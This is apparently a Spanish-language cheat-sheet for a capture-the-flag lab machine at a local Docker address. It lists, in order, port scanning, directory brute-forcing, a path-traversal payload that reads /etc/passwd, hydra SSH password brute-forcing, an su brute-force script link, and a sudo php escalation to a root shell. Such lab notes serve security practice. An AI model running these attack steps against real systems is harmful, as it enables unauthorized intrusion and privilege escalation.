--Descomprimir 
gunzip /usr/share/wordlists/rockyou.txt.gz

---Iniciar máquina
chmod +x auto_deploy.sh | ./auto_deploy.sh inclusion.tar

---Escaneo puertos
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2

--Gobuster
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

--Inyección LFI (si $_GET['archivo'])
?archivo=../../../../etc/passwd

--Ataque fuerza bruta hydra
hydra -l usuario -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh

--Bruteforce dentro de ssh
https://github.com/carlospolop/su-bruteforce
|crear script.sh, darle permisos y ejecutar

--Escalamiento vertical
sudo -l |info
--Si: /usr/bin/php
sudo /usr/bin/php -a
sudo php -r "system('/bin/bash');”  |este si
